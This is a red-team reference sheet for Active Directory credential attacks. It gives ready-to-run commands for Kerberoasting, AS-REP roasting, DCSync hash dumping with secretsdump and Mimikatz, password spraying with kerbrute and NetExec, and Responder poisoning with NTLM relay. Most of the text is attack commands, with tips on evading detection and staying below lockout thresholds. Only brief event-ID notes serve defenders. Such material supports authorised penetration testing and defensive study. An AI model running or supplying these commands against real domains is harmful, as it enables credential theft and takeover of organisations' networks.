# Active Directory Credential Attacks Reference

## Kerberoasting (T1558.003)

### Overview
Request TGS tickets for service accounts (accounts with SPNs), then crack offline.
Any domain user can request these — no special privileges needed.

### Impacket (from Linux)
```
# Request all kerberoastable accounts
impacket-GetUserSPNs domain.local/user:pass -dc-ip <DC_IP> -request -outputfile kerberoast.txt

# Filter for specific accounts
impacket-GetUserSPNs domain.local/user:pass -dc-ip <DC_IP> -request -target-domain domain.local

# With NTLM hash (no password)
impacket-GetUserSPNs domain.local/user -hashes :NTHASH -dc-ip <DC_IP> -request
```

### Rubeus (from Windows)
```
Rubeus.exe kerberoast /outfile:kerberoast.txt
Rubeus.exe kerberoast /user:svc_sql /outfile:kerberoast.txt      # Target specific user
Rubeus.exe kerberoast /rc4opsec /outfile:kerberoast.txt           # Only RC4-encrypted tickets
Rubeus.exe kerberoast /stats                                       # Stats without requesting
```

### Crack TGS Hashes
```
hashcat -m 13100 kerberoast.txt wordlist.txt
hashcat -m 13100 kerberoast.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
# For AES-encrypted tickets:
hashcat -m 19700 kerberoast.txt wordlist.txt
```

---

## AS-REP Roasting (T1558.004)

### Overview
Target accounts with "Do not require Kerberos preauthentication" enabled.
Returns encrypted data crackable offline without any authentication.

### Impacket
```
# With known usernames
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat -outputfile asrep.txt

# With valid creds (enumerate vulnerable accounts)
impacket-GetNPUsers domain.local/user:pass -dc-ip <DC_IP> -request -format hashcat -outputfile asrep.txt

# No authentication needed if you have usernames
impacket-GetNPUsers domain.local/ -no-pass -usersfile users.txt -dc-ip <DC_IP>
```

### Rubeus
```
Rubeus.exe asreproast /outfile:asrep.txt
Rubeus.exe asreproast /user:targetuser /outfile:asrep.txt
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

### Crack AS-REP Hashes
```
hashcat -m 18200 asrep.txt wordlist.txt
hashcat -m 18200 asrep.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## DCSync (T1003.006)

### Overview
Simulate Domain Controller replication to extract all password hashes.
Requires: Replicating Directory Changes + Replicating Directory Changes All (Domain Admin, DC accounts).

### Impacket
```
# Dump all NTLM hashes
impacket-secretsdump domain.local/admin:pass@<DC_IP> -just-dc-ntlm

# Dump everything (NTLM + Kerberos keys + cleartext if stored)
impacket-secretsdump domain.local/admin:pass@<DC_IP> -just-dc

# Target specific user
impacket-secretsdump domain.local/admin:pass@<DC_IP> -just-dc-user krbtgt

# With hash
impacket-secretsdump -hashes :NTHASH domain.local/admin@<DC_IP> -just-dc-ntlm
```

### Mimikatz
```
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:domain.local /all /csv
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
```

### Detection
- Event ID 4662 — DS-Replication-Get-Changes from non-DC source
- Monitor for replication traffic from workstations/servers

---

## Password Spraying (T1110.003)

### Overview
Try one or two passwords against many accounts. Respect lockout policies.

### Kerbrute (fastest — Kerberos pre-auth, no event 4625)
```
kerbrute passwordspray --dc <DC_IP> -d domain.local users.txt 'Spring2025!'
kerbrute passwordspray --dc <DC_IP> -d domain.local users.txt 'Company123!'

# User enumeration first
kerbrute userenum --dc <DC_IP> -d domain.local users.txt
```

### CrackMapExec / NetExec
```
# SMB spray
crackmapexec smb <DC_IP> -u users.txt -p 'Spring2025!' --continue-on-success
nxc smb <DC_IP> -u users.txt -p 'Spring2025!' --continue-on-success

# LDAP spray (different protocol, may avoid detection)
nxc ldap <DC_IP> -u users.txt -p 'Spring2025!' --continue-on-success
```

### Lockout Awareness
```
# Check domain password policy BEFORE spraying
crackmapexec smb <DC_IP> -u user -p pass --pass-pol
# Or via LDAP:
ldapsearch -x -H ldap://<DC_IP> -D "user@domain.local" -w 'pass' -b "dc=domain,dc=local" "(objectClass=domainDNS)" lockoutThreshold lockoutDuration

# Rules:
# - Never exceed (threshold - 2) attempts per lockout window
# - Wait full lockout duration between rounds
# - Common safe: 1 password per 30+ minutes
```

---

## LLMNR / NBT-NS Poisoning (T1557)

### Overview
Respond to broadcast name resolution requests to capture NTLMv2 hashes.
Works when DNS fails and systems fall back to LLMNR/NBT-NS.

### Responder
```
# Full poisoning with all servers
responder -I eth0 -wrfv

# Passive mode (capture only, no poisoning)
responder -I eth0 -A

# Force LM downgrade (weaker, easier to crack)
responder -I eth0 --lm

# Captured hashes → /usr/share/responder/logs/
```

### Crack NTLMv2 Hashes
```
hashcat -m 5600 ntlmv2_hashes.txt wordlist.txt
hashcat -m 5600 ntlmv2_hashes.txt wordlist.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

# NTLMv1 (if captured — rarer, much weaker)
hashcat -m 5500 ntlmv1_hashes.txt wordlist.txt
# Or crack to NTLM hash via crack.sh / rainbow tables
```

### NTLM Relay (instead of cracking)
```
# Relay captured auth to another target (don't respond to same target)
# Disable Responder's SMB/HTTP servers, use ntlmrelayx instead
impacket-ntlmrelayx -t smb://<TARGET> -smb2support
impacket-ntlmrelayx -t ldap://<DC_IP> --escalate-user attacker
```

---

## OPSEC Notes
- Kerberoasting generates event 4769 with ticket encryption type 0x17 (RC4)
- AS-REP Roasting generates event 4768 — harder to detect
- DCSync generates 4662 with replication GUIDs — easy to detect from non-DC
- Password spraying can trigger lockouts — always check policy first
- Responder is noisy — generates broadcast traffic, detectable by IDS
- Prefer Kerberos-based attacks over NTLM when possible (stealthier)
